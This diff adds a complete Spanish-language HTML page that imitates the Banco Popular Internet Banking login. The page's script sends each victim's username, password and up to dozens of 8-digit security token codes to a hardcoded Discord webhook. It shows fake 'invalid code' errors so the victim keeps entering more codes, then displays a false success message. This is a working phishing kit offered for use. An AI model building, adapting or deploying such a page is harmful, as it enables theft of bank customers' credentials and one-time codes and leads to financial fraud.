@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet Banking - Banco Popular</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(180deg, #008eb3 0%, #00668c 45%, #00436b 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 25px 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            margin: 0 auto;
+            gap: 10px;
+        }
+        .logo-box {
+            width: 46px;
+            height: 46px;
+            background: linear-gradient(135deg, #003366 0%, #0077a3 100%);
+            border: 1.5px solid #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .logo-sun {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: repeating-conic-gradient(
+                from 0deg,
+                #ffffff 0deg 10deg,
+                transparent 10deg 20deg
+            );
+            mask-image: radial-gradient(circle, transparent 35%, black 36%);
+            -webkit-mask-image: radial-gradient(circle, transparent 35%, black 36%);
+        }
+        .logo-text {
+            font-family: Georgia, serif;
+            font-style: italic;
+            font-weight: bold;
+            font-size: 26px;
+            letter-spacing: 1px;
+            color: #ffffff;
+        }
+        .close-btn {
+            position: absolute;
+            right: 0;
+            font-size: 28px;
+            font-weight: bold;
+            color: #ffffff;
+            cursor: pointer;
+            line-height: 1;
+        }
+        .nav-tabs {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 28px;
+            padding: 0 5px;
+        }
+        .tab {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .tab.active {
+            background-color: rgba(255, 255, 255, 0.22);
+        }
+        .banner-card {
+            background-color: rgba(255, 255, 255, 0.14);
+            border-radius: 16px;
+            padding: 18px 20px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin-bottom: 35px;
+        }
+        .monitor-icon {
+            position: relative;
+            width: 58px;
+            height: 44px;
+            border: 2px solid #ffffff;
+            border-radius: 4px;
+            flex-shrink: 0;
+            margin-bottom: 8px;
+        }
+        .monitor-icon::after {
+            content: '';
+            position: absolute;
+            bottom: -9px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 24px;
+            height: 7px;
+            border-left: 2px solid #ffffff;
+            border-right: 2px solid #ffffff;
+            border-bottom: 2px solid #ffffff;
+        }
+        .plus-badge {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            width: 26px;
+            height: 26px;
+            background-color: #00789c;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: bold;
+            line-height: 1;
+        }
+        .banner-text {
+            font-size: 14.5px;
+            line-height: 1.35;
+            color: #e6f4f8;
+        }
+        .banner-text strong {
+            color: #ffffff;
+            font-weight: 700;
+        }
+        .title {
+            font-size: 26px;
+            font-weight: 300;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .form-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .input-group {
+            position: relative;
+            background: #ffffff;
+            border-radius: 6px;
+            height: 54px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            border: 2px solid transparent;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+        .input-group.error-red {
+            border-color: #ff3b30;
+            background-color: #fff0f0;
+        }
+        .input-group.error-red input {
+            color: #c91c12;
+        }
+        .input-group input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333333;
+            background: transparent;
+        }
+        .input-group input::placeholder {
+            color: #b0b0b0;
+        }
+        .eye-icon {
+            color: #666666;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding-left: 10px;
+        }
+        .btn-acceder {
+            background-color: #a3a3a3;
+            color: #ffffff;
+            border: none;
+            height: 52px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background-color 0.2s;
+        }
+        .btn-acceder.ready {
+            background-color: #0099cc;
+        }
+        .btn-acceder:disabled {
+            background-color: #70b5cc !important;
+            cursor: not-allowed;
+        }
+        .footer-link {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #ffffff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="logo-wrapper">
+          <div class="logo-box">
+            <div class="logo-sun">
+            </div>
+          </div>
+          <span class="logo-text">POPULAR</span>
+        </div>
+        <span class="close-btn">&times;</span>
+      </div>
+      <div class="nav-tabs" id="tabs-container">
+        <button class="tab active" onclick="selectTab(this, 'Tu cuenta personal')">Personal</button>
+        <button class="tab" onclick="selectTab(this, 'Tu cuenta empresarial')">Empresarial</button>
+        <button class="tab" onclick="selectTab(this, 'Portal de agentes')">Agentes</button>
+      </div>
+      <div class="banner-card" id="banner-card">
+        <div class="monitor-icon">
+          <div class="plus-badge">+</div>
+        </div>
+        <div class="banner-text">
+          Nuestro <strong>Internet Banking</strong> está desplegando una nueva experiencia mejorada con un diseño más fresco.
+        </div>
+      </div>
+      <h1 class="title" id="section-title">Tu cuenta personal</h1>
+      <form class="form-container" id="main-form" onsubmit="event.preventDefault();">
+        <div id="dynamic-fields">
+          <div class="input-group">
+            <input type="text" id="usuario" placeholder="Nombre de usuario" oninput="checkInputs()">
+          </div>
+          <div class="input-group" style="margin-top: 16px;">
+            <input type="password" id="password" placeholder="Contraseña" oninput="checkInputs()">
+            <span class="eye-icon" onclick="togglePassword()">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24">
+                </path>
+                <line x1="1" y1="1" x2="23" y2="23">
+                </line>
+              </svg>
+            </span>
+          </div>
+        </div>
+        <button type="submit" class="btn-acceder" id="btn-submit" onclick="handleMainAction()">
+          <span id="btn-text">Acceder</span>
+          <span id="spinner" style="display:none;">⏳ Cargando...</span>
+        </button>
+      </form>
+      <a href="#" class="footer-link" id="footer-text" onclick="event.preventDefault();">¿Olvidaste tu contraseña?</a>
+    </div>
+    <script>
+        let currentStep = 0; // 0: Login, 1 a 8: Tokens
+        let tokenAttempts = 0; // Contador de veces que se pone rojo (máximo 5)
+        const maxRedAttempts = 5;
+
+        // REEMPLAZA ESTO CON TU WEBHOOK REAL DE DISCORD:
+        const webhookURL = "https://discord.com/api/webhooks/1570951202999377951/D2EEtjJEC3NWsclGVdmlGkGg-Juji63DqavlnJAfe9DCIrdlmsB39ROIpwKtgvt3Qd_F";
+
+        function enviarDiscord(mensaje) {
+            return fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: mensaje })
+            }).catch(err => console.log(err));
+        }
+
+        function selectTab(btn, titleText) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('section-title').textContent = titleText;
+        }
+
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            if(passInput) {
+                passInput.type = passInput.type === 'password' ? 'text' : 'password';
+            }
+        }
+
+        function checkInputs() {
+            const btn = document.getElementById('btn-submit');
+            if (currentStep === 0) {
+                const u = document.getElementById('usuario').value.trim();
+                const p = document.getElementById('password').value.trim();
+                if (u.length > 0 && p.length > 0) {
+                    btn.classList.add('ready');
+                } else {
+                    btn.classList.remove('ready');
+                }
+            } else {
+                const tokenGroup = document.getElementById('token-group');
+                if (tokenGroup) tokenGroup.classList.remove('error-red');
+
+                const t = document.getElementById('token-input').value.trim();
+                if (t.length === 8) {
+                    btn.classList.add('ready');
+                } else {
+                    btn.classList.remove('ready');
+                }
+            }
+        }
+
+        function handleMainAction() {
+            const btn = document.getElementById('btn-submit');
+            const btnText = document.getElementById('btn-text');
+            const spinner = document.getElementById('spinner');
+
+            if (currentStep === 0) {
+                const u = document.getElementById('usuario').value.trim();
+                const p = document.getElementById('password').value.trim();
+                if (u.length === 0 || p.length === 0) return;
+
+                btn.disabled = true;
+                btnText.style.display = 'none';
+                spinner.style.display = 'inline-block';
+
+                // Mensaje 1 en Discord: Usuario y clave juntos
+                enviarDiscord(`👤 **Usuario:** ${u} | 🔑 **Clave:** ${p}`);
+
+                // Dura 5 segundos al darle Acceder
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btnText.style.display = 'inline';
+                    spinner.style.display = 'none';
+
+                    tokenAttempts = 0;
+                    currentStep = 1;
+                    setupTokenStep();
+                }, 5000);
+
+            } else {
+                const tokenInput = document.getElementById('token-input');
+                const tokenGroup = document.getElementById('token-group');
+                const tokenVal = tokenInput.value.trim();
+                if (tokenVal.length !== 8) return;
+
+                btn.disabled = true;
+                btnText.style.display = 'none';
+                spinner.style.display = 'inline-block';
+
+                // Mensaje separado en Discord: Solo el token
+                enviarDiscord(`🔢 **Token:** \`${tokenVal}\``);
+
+                // Dura 10 segundos al darle Continuar antes de presentar el rojo
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btnText.style.display = 'inline';
+                    spinner.style.display = 'none';
+
+                    if (tokenAttempts < maxRedAttempts) {
+                        tokenAttempts++;
+                        tokenGroup.classList.add('error-red');
+                        tokenInput.value = "";
+                        btn.classList.remove('ready');
+                    } else {
+                        tokenGroup.classList.remove('error-red');
+                        if (currentStep < 8) {
+                            currentStep++;
+                            tokenAttempts = 0;
+                            setupTokenStep();
+                        } else {
+                            alert("¡Verificación de seguridad completada con éxito!");
+                            location.reload();
+                        }
+                    }
+                }, 10000);
+            }
+        }
+
+        function setupTokenStep() {
+            document.getElementById('tabs-container').style.display = 'none';
+            document.getElementById('banner-card').style.display = 'none';
+            document.getElementById('section-title').textContent = `Autenticación de Seguridad`;
+
+            const fieldsContainer = document.getElementById('dynamic-fields');
+            fieldsContainer.innerHTML = `
+                <div style="font-size: 14px; margin-bottom: 8px; color: #e6f4f8; text-align: center;">
+                    Por favor, ingrese el código token de 8 dígitos
+                </div>
+                <div class="input-group" id="token-group">
+                    <input type="text" id="token-input" maxlength="8" placeholder="Código de 8 dígitos" oninput="checkInputs()">
+                </div>
+            `;
+
+            document.getElementById('btn-text').textContent = currentStep === 8 ? "Finalizar" : "Continuar";
+            document.getElementById('btn-submit').classList.remove('ready');
+            document.getElementById('footer-text').style.display = 'none';
+        }
+    </script>
+  </body>
+</html>
